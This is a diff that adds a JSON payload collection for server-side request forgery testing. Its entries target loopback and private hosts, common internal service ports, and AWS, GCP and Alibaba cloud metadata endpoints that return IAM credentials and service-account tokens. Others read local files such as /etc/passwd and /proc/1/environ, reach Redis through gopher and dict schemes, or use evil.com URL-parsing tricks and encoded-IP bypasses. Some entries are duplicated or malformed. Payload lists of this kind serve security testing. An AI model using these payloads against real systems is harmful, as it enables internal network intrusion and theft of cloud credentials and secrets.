@@ -1,0 +1,805 @@
+[
+  {
+    "payload_id": "OWP-0369",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0370",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:443",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0371",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://localhost:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0372",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://localhost:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0373",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::1]:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0374",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::1]:22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0375",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0.0.0.0:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0376",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx|IIS|SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0377",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://NaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0378",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0xNaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0379",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::127.0.0.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0380",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::ffff:127.0.0.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0381",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://NaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0382",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0xNaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0383",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::169.254.169.254:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0384",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::ffff:169.254.169.254:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0385",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://NaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0386",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0xNaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0387",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::10.0.0.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0388",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::ffff:10.0.0.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0389",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://NaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0390",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0xNaN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0391",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::192.168.1.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0392",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://[::ffff:192.168.1.1:80]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0393",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://169.254.169.254/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0394",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0395",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://169.254.169.254/latest/user-data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0396",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://metadata.google.internal/computeMetadata/v1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0397",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0398",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Cloud",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|instance-id|access_token|AccessKeyId"
+    }
+  },
+  {
+    "payload_id": "OWP-0399",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:6379",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "redis"
+    }
+  },
+  {
+    "payload_id": "OWP-0400",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:3306",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "mysql"
+    }
+  },
+  {
+    "payload_id": "OWP-0401",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:5432",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "postgres"
+    }
+  },
+  {
+    "payload_id": "OWP-0402",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:27017",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "mongo"
+    }
+  },
+  {
+    "payload_id": "OWP-0403",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:9200",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "elastic"
+    }
+  },
+  {
+    "payload_id": "OWP-0404",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:5984",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "couchdb"
+    }
+  },
+  {
+    "payload_id": "OWP-0405",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:11211",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "memcached"
+    }
+  },
+  {
+    "payload_id": "OWP-0406",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:2181",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "zookeeper"
+    }
+  },
+  {
+    "payload_id": "OWP-0407",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "tomcat|jenkins"
+    }
+  },
+  {
+    "payload_id": "OWP-0408",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:3000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "grafana"
+    }
+  },
+  {
+    "payload_id": "OWP-0409",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:5601",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "kibana"
+    }
+  },
+  {
+    "payload_id": "OWP-0410",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:9000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "php-fpm"
+    }
+  },
+  {
+    "payload_id": "OWP-0411",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:61616",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "activemq"
+    }
+  },
+  {
+    "payload_id": "OWP-0412",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:25",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SMTP"
+    }
+  },
+  {
+    "payload_id": "OWP-0413",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "SSH"
+    }
+  },
+  {
+    "payload_id": "OWP-0414",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:21",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "FTP"
+    }
+  },
+  {
+    "payload_id": "OWP-0415",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=file:///etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0416",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=file:///c:/windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0417",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=dict://127.0.0.1:6379/info",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0418",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0419",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=ftp://127.0.0.1:21",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0420",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=ldap://127.0.0.1:389",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0421",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=file:///proc/1/environ",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|redis|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0422",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:80#@evil.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-0423",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://evil.com@127.0.0.1:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-0424",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:80%09@evil.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-0425",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.1:80:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-0426",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://2130706433:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-0427",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://0x7f000001:8080/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Apache|nginx"
+    }
+  },
+  {
+    "payload_id": "OWP-1561",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://10.0.0.1:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1562",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://10.0.0.1:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1563",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://172.16.0.1:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1564",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://172.16.0.1:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1565",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://192.168.0.1:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1566",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://192.168.0.1:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1567",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.2:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1568",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.2:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1569",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.3:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1570",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.3:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1571",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.4:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1572",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.4:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1573",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.5:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1574",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Web Application",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://127.0.0.5:8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
